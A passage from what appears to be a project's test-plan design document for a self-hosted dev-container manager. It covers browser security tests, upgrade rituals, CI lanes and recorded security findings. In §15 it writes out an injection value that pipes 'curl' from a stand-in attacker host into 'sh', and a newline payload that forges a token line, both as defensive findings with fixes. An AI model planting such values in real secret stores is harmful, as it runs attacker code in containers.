10. **sign-in honours `return`** — a deep link to `/ws/<id>` while signed out lands on sign-in and comes back to that workspace, which is the only part of the auth flow a reducer test cannot see;
11. **a `401` mid-session routes to sign-in rather than rendering stale state** — provoked by deleting the `auth_session` row underneath a live page, which is also the cheapest way to assert the frontend design's §4.4 rule that entity state is *cleared* and not kept;
12. **the login handshake survives a reload** between the URL appearing and the code being pasted — the app-switch case from frontend §2.4, and the reason that handshake's state lives on the server at all. A page reload is a real navigation, so no amount of component testing reaches it;
13. **`EventSource` reconnect replays the gap** — kill the stream, write three events, let the browser reconnect on its own, and assert the page agrees with the database. The browser's automatic `Last-Event-ID` is the thing under test, and it is browser behaviour, not application code.

### 10.3  Where a frontend test goes

Two tiers can now hold a test about the UI, so the rule from §3.1 needs one sentence of application rather than a second convention: **if the assertion needs a server, a cookie jar, or a real navigation, it is a browser test; if it needs only a function and a DOM, it is a frontend test.**

That line falls where it does because of the frontend design's central rule — the client owns no state machine, so almost everything interesting about it is a pure function from an event sequence to a rendered card ([frontend §2.1](../frontend/frontend-design.md), §4.1). Those are the cheapest tests in the repository and there should be many of them:

| Assertion | Tier | Why there |
|---|---|---|
| Every `(workspace, supervisor)` pair renders one status and one action | frontend | A parameterized table over a pure mapping. Thirteen cases, no server, milliseconds. |
| A blanked credential replaces session-dependent cards but not a build failure | frontend | The §6.6 override is a function of one fleet-wide value; the interesting part is what it leaves *alone*. |
| A `202` response body is discarded rather than applied | frontend | The one rule whose violation looks like working code, so it wants a test that fails loudly in the fast lane. |
| Out-of-order event ids, a replayed gap, an event for an unknown workspace | frontend | Reducer inputs. Constructing these against a real server would be elaborate; as fixtures they are three lines each. |
| The four refused-start signatures each produce a different message | frontend | A mapping from a classified signature to a sentence — which is exactly why §9 of the frontend design asks the API to send the signature rather than prose. |
| Items 10–13 above | browser | Server, cookie jar, or navigation. |

The practical consequence for CI: the frontend tier joins **unit** and **component** in the fast lane (§12), because it is the same order of magnitude — a `jsdom` suite over pure functions finishes before a Docker daemon has started. Nothing about the UI should be waiting on the browser tier to tell a contributor they broke the card.

### 10.4  As built

Implemented in [`test/browser/`](../../../test/browser/), run by `test/browser/run.sh` locally and by CI's `browser` job on every push. One Playwright worker owns one stack for the whole run — the real `drydock serve` (built from the checkout, a temp database, a `drydock passwd`-set password, a secrets key), real Caddy on `deploy/Caddyfile` and `deploy/preview.caddy` byte for byte, and Playwright's Chromium — under one temp root that is removed at teardown. Fifteen tests, about eight seconds once Chromium is installed — plus `engines.spec.ts`, run once per engine (below).

**Three engines, two paths.** Chromium runs every spec on the TLS stack. Playwright's **Firefox and WebKit** run `engines.spec.ts` only, against the same `drydock serve` through a **loopback front** on `http://127.0.0.1:<port>`. It exists because of a release bug the tier could not see: v0.2.1's API client sent mutations in mode `same-origin` under the page's `no-referrer` policy, and the Fetch standard serializes the `Origin` of such a request as **`null`**. Safari did exactly that on the operator's first sign-in (`forbidden_origin`), and Playwright's WebKit and Firefox reproduce it through the real form; Chromium sends the real origin either way, so `ui.spec.ts` passed. The spec drives the app's own client — the real sign-in form and Settings' sign-out — and asserts at the front that the `Origin` the browser sent is exactly the page's origin, and that the server took it. Playwright's WebKit is not Safari, but it is the same engine family and showed the same symptom, byte for byte. Why a loopback front and not the TLS stack: this tier has no per-run trust store for Firefox or WebKit to put its CA in (Chromium's per-run `HOME` has no equivalent for them here), and `ignoreHTTPSErrors` stays banned. The front records what the browser sent and then rewrites `Host` to the UI host and an `Origin` that is *exactly* its own to the UI origin; everything else, `null` included, is forwarded untouched, and the spec's first assertions prove that from Node (`null` → `403`, the front's origin with a trailing `/` → `403`, its exact origin → past the gate). It also renames the session cookie and drops `Secure` on the way to the browser, because WebKit keeps no `Secure` cookie from an `http:` page even on loopback; the cookie's own rules stay `cookies.spec.ts`'s, in Chromium over TLS. The `Origin` rule under test does not depend on the scheme for a same-scheme request.

Four things about the harness that are decisions rather than plumbing:

- **The CA is trusted in a per-run `HOME`, not in `~/.pki/nssdb`.** Chromium reads its NSS store from `$HOME/.pki/nssdb`, so the browser is launched with `HOME` pointing into the temp root. That is Spike 04's method with its one hazard removed: there is no entry in the operator's own store to forget to delete, on `SIGINT` or otherwise. It also makes the untrusted control cheap — a second `HOME` with an empty store must fail with `ERR_CERT_AUTHORITY_INVALID`, or the trust store is not what is doing the work.
- **A tap sits between Caddy and each Drydock socket.** It forwards bytes unchanged, streams rather than buffers, and records what arrived — whether the session cookie came with a request, `Origin`, `Sec-Fetch-*`, `Last-Event-ID`, the status. That is the only place "carries no cookie" can be asserted: a cross-site request that was blocked and one that was sent bare are the same from inside the page (Spike 04, D1/D2). `DRYDOCK_API_SOCKET` points Caddy at the tap; the Caddyfile is not edited.
- **"SameSite failed" is simulated in the jar, not on the wire.** A route cannot add a `Cookie` header in Chromium, and cannot strip or rewrite `Origin` either — the browser re-applies both. So item 2 replaces the session cookie with the same value marked `SameSite=None`, which makes a cross-site request really carry it, and lets the real page send its real `Origin` (the preview origin, and `null` from a sandboxed frame). A cross-site `POST` with **no** `Origin` cannot be produced by a browser at all; that case stays in component (§8.1).
- **The wrong-host certificate is a test, with its control.** A second Caddy on the shipped Caddyfile serves the UI host the preview wildcard — signed by the trusted CA, wrong for `drydock.test` — and the browser must refuse it with `ERR_CERT_COMMON_NAME_INVALID`, while the same profile loads the main Caddy. This is the reason `ignoreHTTPSErrors` stays banned, asserted rather than argued.

What each §10.2 item became:

| §10.2 | Status | Test |
|---|---|---|
| 1. cross-site `POST` carries no cookie, is refused | built | `crosssite.spec.ts` — at the tap: `cookie=null`, `401`/`403`; control: the same-site request carries it, and the `POST` did arrive |
| 2. …and with `Origin` stripped, still refused | built, as the belt | `crosssite.spec.ts` — the cookie forced through (`SameSite=None` in the jar), `Origin` the preview's and `null`: `403`; control: a same-origin `POST` passes the gate |
| 3. a data `GET` cannot be read cross-origin | built | `crosssite.spec.ts` — the server answers `200` with the cookie forced through, sends no `Access-Control-Allow-Origin`, and the page gets a `TypeError`; control: same-origin reads the body |
| 4. `__Host-` accepted, variants refused | built | `cookies.spec.ts` — the real sign-in's cookie with every attribute, replayed at the server; three illegal variants dropped, the legal one in the same response kept |
| 5. the authorize handshake; the cookie survives the cross-site navigation | **half**: the navigation | `crosssite.spec.ts` — a real *click* from the preview origin to `/preview/authorize` arrives `cross-site`, `navigate`, **with** the cookie. The four-redirect handshake waits for previews (port forwarding §7) |
| 6. preview A cannot read preview B | deferred | needs the preview cookie and a proxied dev server, neither built |
| 7. the UI cannot be framed from a preview origin | built, both directions | `framing.spec.ts` — the framed UI is requested and served, and renders Chromium's error page; control: a frameable cross-origin document renders in the same page. And the UI's `frame-src 'none'` refuses a preview, with a `securitypolicyviolation` and no request |
| 8. HMR through two hops | deferred | previews |
| 9. SSE to a real `EventSource` through Caddy, unbuffered | built | `events.spec.ts` — an event arrives within seconds with the stream still open. The browser asks for compression, and Caddy's `encode` does compress the stream (`zstd`) — asserted, so a change that stopped `encode` matching `text/event-stream` fails the test rather than leaving it passing on `identity` — so this is the path where a buffering encoder would bite |
| 10. sign-in honours `return` | built | `ui.spec.ts` |
| 11. a `401` mid-session goes to sign-in and clears state | built | `ui.spec.ts` — the `auth_session` rows deleted underneath a live page; with `GET /api/secrets` blocked, held state renders before (the control) and does not after |
| 12. the login handshake survives a reload | **built** | `login.spec.ts` — the real sign-in view through Caddy: Sign in to Claude, the URL, a reload, the same URL and the countdown read back from the server, the code pasted and signed in; then the code's request seen at the tap with the UI's Origin and the code in no path, fakeclaude's hash as the control, and a sweep of every file the stack wrote (Caddy's and Drydock's logs, the database) and the page. The tier's `drydock serve` runs with a stand-in `docker` that puts fakeclaude where the login container's claude would be; returning no `login` from `GET /api/auth/claude` fails it. |
| 13. reconnect replays the gap | built | `events.spec.ts` — Caddy is killed, three events written, Caddy restarted; the browser's own reconnect sends `Last-Event-ID` (header, not the app's query), and with the refetch blocked the page lists exactly what the database does |

Plus three the plan did not number: the security headers on the page as served through Caddy, the UI loading only through NSS trust (with the untrusted control), and the wrong-host refusal above.

**Mutation-checked.** Each of these was applied and the named test went red: `frame-ancestors 'none'` removed from the CSP (the framing test, on behaviour — the frame rendered the app); `SameSite=Strict` (the cross-site navigation arrived without the cookie); `SameSite=None` (the cross-site `POST` carried it); `--ignore-certificate-errors` on the launch (both certificate tests); the stream handler ignoring `Last-Event-ID` (the replay test); the stream not flushing per event (the SSE test); `OriginAllowed` accepting any single `Origin` (the belt test); and the frontend's `clearEntityState` keeping the stores (the `401` test); and the API client without `referrerPolicy: 'same-origin'` — `dist` rebuilt from it — which put `Origin: null` on Firefox's and WebKit's sign-in (`403`, *"This request did not come from Drydock's own page"*) and left Chromium without a `Referer`, while a front that laundered `null` failed its own control. One did not: removing `frame-src 'none'` leaves the UI still unable to frame a preview, because `default-src 'self'` already covers frames. That directive is pinned by the exact-CSP assertion on the served header, and it stays — it refuses a *same-origin* frame too, which `default-src 'self'` would allow — a second layer behind the `frame-ancestors 'none'` every same-origin response already carries.

## 11. Rituals

Triggered by an event, never by a commit. Each is a file in `test/rituals/` with a checklist and the commands, so it is repeatable by someone who has forgotten the details — the same reasoning that put the Spike 00 harness next to its report.

### 11.1  Claude Code version bump

The heaviest one, and heavier than draft v1 assumed: the pin now guards four measured behaviours, not two. Everything the Phase 0 spikes established — the refresh lock, the authorize-URL shape and `auth status --json` schema, the reconnect behaviour with its four refusals and three config gates, and the per-command prelude — is undocumented internals of one version.

1. Bump the pin in the Feature. Build the test base image.
2. **Re-run all four harnesses** — named in the table below — and update each spike's "verified against" line and verdict.
3. **Re-record the transcript corpus** (§7) at both PTY widths into `claude-<newversion>/`, and re-capture the four `auth status --json` shapes.
4. `diff` old against new. A change in the URL pattern, a prompt string, a refusal signature, the OSC 8 wrapping, or the `auth status` schema is a **parser change**, not a fixture update — make the parser handle both and keep both corpora.
5. Run the unit scrape tests against **both** corpora. The old one stays until a version is no longer deployable.
6. Run the container tier.
7. Update the version in CLAUDE.md, the Feature, and **all four** spike reports *in the same commit*; the consistency test in §8.4 enforces that they agree.

| Harness | Re-measures |
|---|---|
| `docs/design/spikes/harness/` | 00 — the refresh lock, write atomicity, the stale-lock window |
| `docs/design/spikes/harness-01-login/` | 01 — the authorize URL and its wrapping, the code shape, the `auth status --json` schema |
| `docs/design/spikes/harness-02-restart/` | 02 — reconnection, the `409` window, the three config gates, OSC 8 wrapping |
| `docs/design/spikes/harness-03-env-file/` | 03 — the per-command prelude, `argv` composition, `exit` semantics |

Step 2 before step 3 is deliberate. The harnesses exercise the real binary and will fail loudly on a behavioural change; the corpus only records whatever came out. Re-recording first would quietly bake a regression into the fixtures and leave the parser tests green.

### 11.2  `devcontainer` CLI or Docker bump

Run the `fakedevcontainer` contract test (§6.1) and the Feature scenario suite. The JSON result shape and `--additional-features` composition are the two things that would break quietly.

### 11.3  GitHub App contract

Quarterly, or on any GitHub API change notice: the manual test against a real test App and a throwaway repo. Asserts the installation-token request and response shapes `fakegithub` assumes, and — the part only real GitHub can prove — that a token scoped to one repository genuinely cannot touch another, and that a push touching `.github/workflows/` fails without `workflows: write`.

### 11.4  Release smoke test

Before any release, on the real dev server, with a real repo: clone → container → login handshake → a session appears in the Claude app on a phone → push a branch → open a PR → preview a dev server from the phone. Record the cold and warm timings against §1's targets, as data rather than a gate.

This is the only place the human halves of §7.2 and §8 are exercised, and the only place "the session appears in the Claude app" is ever verified. It is a checklist, honestly, and that is the right shape for it.

### 11.5  Amnesia and reboot drill

Quarterly: on the real server, stop Drydock, move the SQLite file aside, start it, and confirm every workspace is adopted and usable. Then reboot the host and confirm the same. The container tier automates this against fixtures (§8.6); the drill is what proves it against workspaces that have been running for weeks.

### 11.6  Chromium or Playwright bump

Run [Spike 04](../spikes/04-browser-ca.md)'s harness: `./run.sh all` and `./run.sh wrongcert`. A Playwright bump also moves its Firefox and WebKit, so run `test/browser/run.sh` for all three projects and reinstall the browsers (`npx playwright install --with-deps chromium firefox webkit` in `web/`); Spike 04 is Chromium's alone, and the other two engines are asserted only on `engines.spec.ts`'s `Origin`. (The tier itself re-asserts the cookie split and the wrong-host refusal on every push since §10.4; what the spike adds is the `spki` and `ignore` columns, which tell you whether a fallback trust route would still notice a wrong certificate.) It is a minute, and it re-measures the whole set of browser behaviours the tier assumes — cookie prefix enforcement, the `SameSite=Lax` split between a cross-site `POST` and a cross-site top-level navigation, and whether the NSS trust route still validates certificates.

This is a lighter ritual than §11.1 but the same reasoning: those are **browser** behaviours, not application code, and §2.3 lists them as the second dependency with no stable contract. The difference is that a browser bump is likelier to tighten cookie rules than to loosen them, so the expected failure mode is a test going red on a behaviour the design wanted anyway. The `wrongcert` run matters most if the trust route ever has to change — it is what would catch a Chromium release that stopped validating names under a locally-trusted CA, which would silently turn the tier into the `spki` row.

## 12. CI topology

| Lane | Contents | Trigger | Runner |
|---|---|---|---|
| **fast** | unit + component, `-race`, and the frontend tier (`vitest run`, plus the §1 bundle budget) | every push | hosted; no Docker needed — but it now needs Node, which the devcontainer already carries |
| **deep** | container tier + Feature scenarios | push to `main`, and PRs by label | self-hosted in the devcontainer's DinD |
| **browser** | the browser tier (§10.4) | every push — it needs no Docker and runs in seconds | hosted: Chromium, Firefox, WebKit, Caddy and `certutil` are installed by the job |
| **rituals** | §11 | by hand, by event | wherever the event is |

The fast lane is the gate. Deep is allowed to be slower than a human's patience, which is why it is not on every push — but they must run before a merge to `main`, because the invariants they cover are exactly the ones that fail silently.

> [!WARNING]
> **A self-hosted runner on the dev server is itself a security decision**
>
> The deep lane needs a real Docker daemon, and the natural place to find one is the machine Drydock already runs on. That means test code executes with Docker access next to production. Three rules make it acceptable rather than reckless, and they are not optional:
>
> - **Never run untrusted code.** No `pull_request_target`, no fork PRs, no workflow that checks out a branch an outsider can write. A self-hosted runner that builds a fork's PR is a host compromise with extra steps.
> - **Not the Drydock user.** The runner runs as its own user, outside the `drydock` group, so a test cannot reach the production socket even by accident.
> - **Inside the devcontainer's DinD, never against a daemon holding production containers** — which, with the test label namespace from §5.4, is belt and braces on the one failure that destroys work.
>
> The honest alternative is a second small machine. If these three rules ever feel inconvenient, that is the signal to buy it rather than to relax them.

## 13. Phase map

§14 of the overall design already writes a "done when" for each phase. These are those sentences turned into named tests, which is the point: a phase is done when its row's tests pass, not when it demos.

| Phase | "Done when" becomes | Also must exist |
|---|---|---|
| **0 — Spikes** | **Done** — five harnesses and five reports exist; the browser-harness question (§10.1) is answered by [Spike 04](../spikes/04-browser-ca.md). What this plan still owes it: the transcript corpus recorded from them, and the scrape parsers passing against it | `fakeclaude` shaped by what 01–03 measured, and the §5 seams decided on paper |
| **1 — Front door** | **the whole of §8.1**, driven off the route table | the route table as data (§5.1), the injected clock (§5.2), the canary sweep (§4.2), the Caddyfile conformance test (§3.2), and the `rebind` / `csrf-*` / `brute-force` scenarios |
| **2 — Walking skeleton** | §8.6 in full, including the amnesia test and the three kill -9 cases | `fakedevcontainer` and its contract test; the fixture repos; the test label namespace (§5.4) |
| **3 — Credentials** | §8.3 in full — and the negative half is the phase's actual deliverable: a container that **fails** to touch any other repo | `fakegithub` with the git remote; the shim tests (§6.6); `cross-broker` |
| **4 — Secrets** | §8.2 in full, plus the stated pair: granted repo's suite passes, ungranted repo's fails | the §15.1/§15.2 findings answered, with `secret-injection` as their regression test |
| **5 — Claude** | §8.4 in full against `fakeclaude` — including the three config gates, the hang, and the `409` wait; the real half is ritual §11.4 | the bump ritual written down before the first bump, not after; the two unverified Phase 0 assertions closed (`Login successful` recorded live, worktree trust tested) |
| **6 — Livability** | the §12 failure-mode messages, each asserted by the test that provokes its failure | the cap-refusal and disk pre-flight rows of §8.6 |
| **Previews** (after Phase 2) | §8.5 and the browser tier; PF §14.1's first open question answered and struck | `fakeupstream` — the local CA harness already exists as [Spike 04](../spikes/04-browser-ca.md)'s `mkcerts.sh` plus its NSS trust step |

Two notes on ordering. Phase 1 carries a disproportionate share of the infrastructure — four of the five seams and both rules — and that is deliberate for the same reason §14 puts the front door first: retrofitting the route-table meta-test onto routes written without it is how an unauthenticated endpoint survives. And Phase 3's done-when is the first place the suite's negative half is the *product* rather than a guardrail, which makes it the best early test of whether §4.1 is being honoured.

## 14. What this deliberately gives up

- **No test of whether the agent behaves.** Out of scope by §1, and §10.4 of the overall design already says no mechanism exists to test.
- **No perf gate.** Measured in §11.4, recorded, never asserted. A flaky gate is a disabled gate.
- **No mocked SQLite, and no mocked HTTP server.** Real file, real socket, every tier. The bugs in this system live in configuration and at boundaries, and a mock removes exactly the boundary that was going to be wrong.
- **No golden-image snapshot of the UI.** One smoke render that the page loads and the sign-in form exists; the UI is a status page, and pixel tests on a status page cost more than they catch.
- **No chaos engineering.** Three targeted kill -9 points (§8.6) and the amnesia test cover the failures that actually happen on a single host. Random fault injection would be a lot of machinery for a restart-safe service with one operator.
- **No attempt to automate the human halves.** Carrying a login code from a browser, and seeing a session in the Claude app, stay in §11.4's checklist. Automating a thing that happens once every few weeks, with a real credential, would cost more than it saves and would need a real account in CI.
- **No test that the five Remote-Control-killing variables actually kill Remote Control.** The Feature's assertion that they are unset is tested; the upstream behaviour is documented in §2.1 and taken on faith.

## 15. Design questions this plan surfaced

Writing down how each invariant would be *proved* turned up five places where the design as written admits a wrong implementation. Three are security findings. They are recorded here rather than silently patched into the parent documents, because the fix is a design decision, not a test.

> [!NOTE]
> **Resolved — all five are applied as of overall v7 and port-forwarding v4 (4 October 2026)**
>
> The finding text below is kept as written, because the reasoning is the part worth preserving; what changed is that each now has an answer in the document that owns it. This section is a dated record, not an open list.
>
> | Finding | Landed as |
> |---|---|
> | 15.1 — line protocol vs arbitrary bytes | Control characters refused on write (overall §10.1, *Value validation*); the client fails the fetch when `count=` disagrees with the lines received (§10.3); two rows in §12; a §13.5 non-negotiable |
> | 15.2 — `eval` injection | `export` single-quotes every value, escaping as `'\''` (overall §10.3, in the same callout); the §13.5 non-negotiable covers both halves |
> | 15.3 — three unstorable states | `claude_identity.state`, `workspace.environment_id`, and `waiting_registration` in `supervisor.state` (overall §4); the stale `-- parsed from /status` comment fixed; a `409` row in §12 |
> | 15.4 — retired slug reissuable | `DELETE` retires rather than deletes, with a partial unique index on live rows (PF §5, §6); a §10.7 non-negotiable |
> | 15.5 — label key a constant | A configured prefix recorded at first run, with reconciliation refusing a foreign one (overall §6 callout); a §13.5 non-negotiable |
>
> Two of them changed shape before being fixed, which is worth keeping on the record: §15.2 got *worse* when v6 adopted the per-command prelude as **the** secrets mechanism, moving the sink from once per supervisor start to once per Bash command; and §15.3 grew from one missing column to three, because the v6 pass revised the prose in §7.3 and §8 without touching §4.
>
> The tests that hold each one down are in §8.2 and §8.5. A finding closed in prose with no test is a finding that reopens quietly.

### 15.1  `GET-SECRETS` is a line protocol and secret values are arbitrary bytes

PF-adjacent, but it is overall §10.3. The protocol is:

```text
← OK count=3
← TEST_DATABASE_URL postgres://…
← END
```

A secret value containing a newline breaks the framing — and does so controllably. A value of

```text
hunter2
GH_TOKEN ghp_attacker_controlled
```

delivers a second, forged `NAME value` line. The reserved-name list in §10.1 is validated on *write*, so it never sees this; the consumer parses it as two secrets and `GH_TOKEN` shadows the `gh` shim's expiring repo-scoped token with a static attacker-chosen one — the exact failure §10.1's reserved list exists to prevent, reached around the side.

The same framing concern applies to the `count=` line: a value containing a newline makes the count disagree with the number of lines, which a lenient parser will ignore.

**Recommendation.** Either reject control characters (`\n`, `\r`, NUL) in secret values at write time — simplest, and consistent with validating names on write — or make the protocol framed rather than line-oriented (length-prefixed values, or base64). Prefer rejecting at write: it keeps the "small enough that the in-container client is a shell script with `nc`" property §5 argues for. Then assert the count matches the lines received, and fail the fetch rather than the parse.

### 15.2  `eval "$(drydock-secrets export)"` is a shell-injection sink — and v6 made it worse

Draft v1 filed this against §8's supervisor start, where it fires once per `exec`. Draft v6 adopted "the environment pulls" as **the** delivery mechanism on the strength of [Spike 03](../spikes/03-claude-env-file.md), so the same `eval` now runs in a fresh shell **before every Bash command the agent issues**, for the life of the session. The sink did not move; its rate went from once per supervisor start to once per command, and the mechanism carrying it is now the primary one rather than an unverified option.

If `export` emits `NAME=value` without quoting, a stored value of

```text
'; curl -s evil.example/x | sh; '
```

executes as the remote user in the container, with the broker socket mounted. The injection rides in the *value*, so it arrives through the ordinary `PUT /api/secrets/:name` path, and under v6 it re-executes on every tool call rather than waiting for a restart.

Severity is still bounded by who can write a secret: that requires a signed-in session, and §13.4 already grants a signed-in session a great deal. What it converts is "can store a secret" into "runs code in every granted container, continuously" — a boundary the design otherwise maintains, and one line to close.

**Recommendation.** `export` emits single-quoted values with embedded single quotes escaped (`'\''`), covered by a property test: for arbitrary byte strings, `eval "$(drydock-secrets export)"` leaves the variable byte-identical to what was stored. That is the one place in this document where fuzzing clearly earns its keep. Note that §8.2's new `argv` row is *not* a substitute — Spike 03's finding that values stay out of `ps` holds precisely because the helper is invoked rather than inlined, and says nothing about whether its output is safe to `eval`.

### 15.3  Three states the prose now requires and the schema cannot hold

Draft v1 filed one missing column. Draft v6 added two more of the same kind: §4's schema was not touched by the Phase 0 revisions, so three states the new prose depends on have nowhere to live. Each fails the same way — an inference spread across readers instead of a column — and each is invisible to a test at the database boundary, which is the cheapest place to catch it.

| Required by | Needs | Today |
|---|---|---|
| §7.3's five identity states, incl. *blanked* vs *absent* | `claude_identity.state` | `expires_at`, `last_checked_at`, and a comment still reading `-- parsed from /status` — a mechanism v6 replaced with `auth status --json` plus a file read |
| §8's "store the environment id in `workspace`" | `workspace.environment_id` | no column. The durable handle Spike 02 identified, and the card's only link, has nowhere to go |
| §8's "the `409` deserves its own state" | a sixth value in `supervisor.state` | the enum is `starting\|awaiting_login\|serving\|degraded\|exited`. A wait that must not spend the restart budget cannot be distinguished from a failure that should |

The third is the one with teeth. §8 is explicit that a `409` is a wait, that the UI must say *waiting* rather than *failed*, and that it must not consume the crash-restart budget — and with no state to record it in, the natural implementation stores `degraded` and a `last_error`, which is exactly the conflation the section warns against.

**Recommendation.** Three columns, one commit: `claude_identity.state`, `workspace.environment_id`, and `waiting_registration` added to the `supervisor.state` enum. Fix the stale `/status` comment in the same pass. Each is then written by a classifier from §5.5 and asserted by the schema snapshot test in §8.2 — a column that exists is a state a test can read.

### 15.4  A retired preview slug can be reissued

PF §4 says the random suffix exists so that "deleting and re-adding a port produces a *different* URL, which means a stale bookmark fails closed." `forwarded_port.slug` is `UNIQUE`, but uniqueness is only against *live* rows — nothing stops a future row, on a different workspace, from being minted the retired slug. A stale bookmark then lands on a different workspace's preview, which is precisely the cross-workspace exposure F3 was about, reached by birthday rather than by cache staleness.

Four characters over a per-repo-per-port namespace makes this unlikely, not impossible, and the consequence is disproportionate to the probability.

**Recommendation.** Keep retired slugs: either a `retired_slug` table checked at mint, or soft-delete `forwarded_port` rows so the `UNIQUE` constraint keeps doing the work it already does. Then §8.5's property test has something to assert against.

### 15.5  The label key must be configuration, not a constant

Covered as a seam in §5.4, repeated here because it is a change to the parent document rather than only to test code: §6 and PF §8 both name `drydock.workspace=<id>` as a literal. A second Drydock on the same daemon — which is exactly what a test is — will adopt the first's containers, and the advisory lock in §12 does not prevent it because the lock is on the database file. The key needs a configurable prefix, and startup should refuse to adopt containers carrying a *different* prefix than its own.

## 16. Open questions

### 16.1  Still open

1. ~~**Can a headless Chromium be made to trust a local CA cleanly enough for `__Host-` semantics?**~~ **Answered — yes.** [Spike 04](../spikes/04-browser-ca.md): NSS-store trust, fourteen assertions, no `ignoreHTTPSErrors`. The browser tier is built as §10.1 specifies and keeps all nine of its assertions. Two things the answer changed rather than merely confirmed: the `ignoreHTTPSErrors` prohibition stands on a different reason than this plan gave (it is blind to a *misissued* certificate, not to cookie semantics), and `--ignore-certificate-errors-spki-list` is a documented fallback for a CI that cannot write an NSS store, at the cost of that same blindness. The devcontainer needs `libnss3-tools`.
2. **Does a `--spawn worktree` session need its own trust record?** Inherited from v6 §11, which measured trust as keyed on the absolute path and left this untested. It is a test-design problem as much as a design one: it fails only for the *second and later* sessions in a workspace, so a container test that opens one session passes and the suite never sees it. The fixture has to open two, which means `fakeclaude` needs a spawn mode that reports a worktree path — cheap, but only if it is built before Phase 5 rather than discovered during it.
3. **Is `devcontainer features test` enough for the hostile scenarios, or does the Feature need a bespoke harness?** The official harness is scenario-per-config, which fits §11's assertions well; whether it can assert on a *build failure's message* — and on a **hang**, now that `remoteDialogSeen` makes a timeout one of the expected verdicts — is the thing to check. If it cannot, those scenarios move into the container tier as direct `up` invocations.
4. **How warm can the container tier's cache be kept in CI?** The budget in §3 assumes a shared base image survives between runs. On a self-hosted runner it does, trivially; the question is whether the deep lane stays under ten minutes on a cold runner after a dependency bump, or whether it needs an explicit image-cache step.

### 16.2  Deferred, and what would reopen each

| Deferred | Reopen when |
|---|---|
| **Fuzzing beyond the two targets** (§15.2's property test, the upstream-override fuzz in §8.5) | a parser grows. The `/proc/net/tcp` reader and the broker protocol are the candidates — both parse attacker-adjacent bytes, both are currently small enough for a table. |
| **A second machine for the deep lane.** | any of §12's three self-hosted-runner rules becomes inconvenient. That inconvenience *is* the trigger; relaxing a rule instead is how the dev server gets compromised by its own CI. |
| **Mutation testing** on the auth middleware and the broker. | the suite is green through a real incident. That is the signal that the assertions are weaker than they look, and mutation testing is the cheapest way to find out where. |
| **Testing the sandbox credential tiering** (§10.5 of the overall design). | that section is adopted. Its own spike comes first; the test for `mask` mode is "a sandboxed command sees the sentinel and the outbound request carries the real value", which needs the feature to exist. |
| **Load testing the preview mux.** | the connection cap in PF §10.7 is ever hit in anger. The component test asserts the cap engages; what it does not establish is whether the cap is set at a sensible number, and that is an observation, not a test. |

---

#### What I would revisit first

The two rules in §4 are the part of this plan I would defend hardest and the part most likely to decay. Paired assertions and the canary sweep are both disciplines, and §10.4 of the overall design already observes that "a discipline is only as good as the day you are in a hurry" — a negative test written without its positive control looks identical to one written with it, right up until the feature silently breaks and the suite stays green. If there is one place to spend effort making the discipline mechanical rather than remembered, it is there: a lint that fails a test file asserting only `404`, `401`, or `403` without also asserting a success in the same function would be crude, and would probably still be worth it.

The tiering itself I expect to survive unchanged, because it is derived from where the substitutions have to happen rather than from a pyramid. What I am least sure of is the browser tier's cost. It answers questions nothing else can, and it is also the only tier with a dependency on a toolchain the rest of the repo does not have — if it turns out to need a real domain and a real certificate to be trustworthy, the honest answer may be that those nine assertions move to §11's checklist and get run by hand before a release, which would be a loss worth naming rather than absorbing quietly.

---

*Supplements `docs/design/overall/drydock-design.md` draft v7, `docs/design/port-forwarding/port-forwarding-design.md` draft v4, and `docs/design/frontend/frontend-design.md` draft v4. §15 contains five findings that were changes to those documents rather than to this one; **all five are applied** as of overall v7 and port-forwarding v4, so that section is a dated record of the reasoning rather than an open list.*
